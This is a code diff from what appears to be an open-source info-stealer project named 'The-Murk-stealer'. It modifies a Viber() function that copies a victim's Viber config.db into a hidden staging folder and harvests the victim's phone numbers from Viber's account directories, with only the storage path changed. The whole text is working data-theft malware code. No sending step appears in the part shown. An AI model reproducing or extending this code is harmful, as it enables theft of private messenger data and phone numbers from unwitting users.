@@ -10,23 +10,25 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import sep,listdir,makedirs,getenv
+from os import sep,listdir,makedirs,getenv,environ
 from shutil import copy2
 from manager.logger import Log
+from preferences.config import config
 
 
 def Viber():
         msgInfo = ""
         try:
             path = 'ViberPC'   
-            local = getenv('LOCALAPPDATA')
             roaming = getenv('APPDATA')
-            makedirs(rf'{local}\windll\Messengers\Viber')
-            copy2(roaming+ sep + path+"/config.db",rf'{local}\windll\Messengers\Viber')
+            user = environ['USERPROFILE']
+            pathtofile = f'{user}\\{config.pathToLogs}\\Messengers\\Viber'
+            makedirs(pathtofile)
+            copy2(roaming+ sep + path+"/config.db",pathtofile)
             dirs = listdir(f"{roaming+sep+path}")
             for filename in dirs:
                 if (filename.isdigit()):
-                    with open(rf"{local}\windll\Messengers\Viber\phoneNumber.txt", "a", encoding="utf-8") as num:
+                    with open(f"{pathtofile}\\phoneNumber.txt", "a", encoding="utf-8") as num:
                         num.write("+"+filename)
                     num.close()
             msgInfo+="\n∟📨Viber"
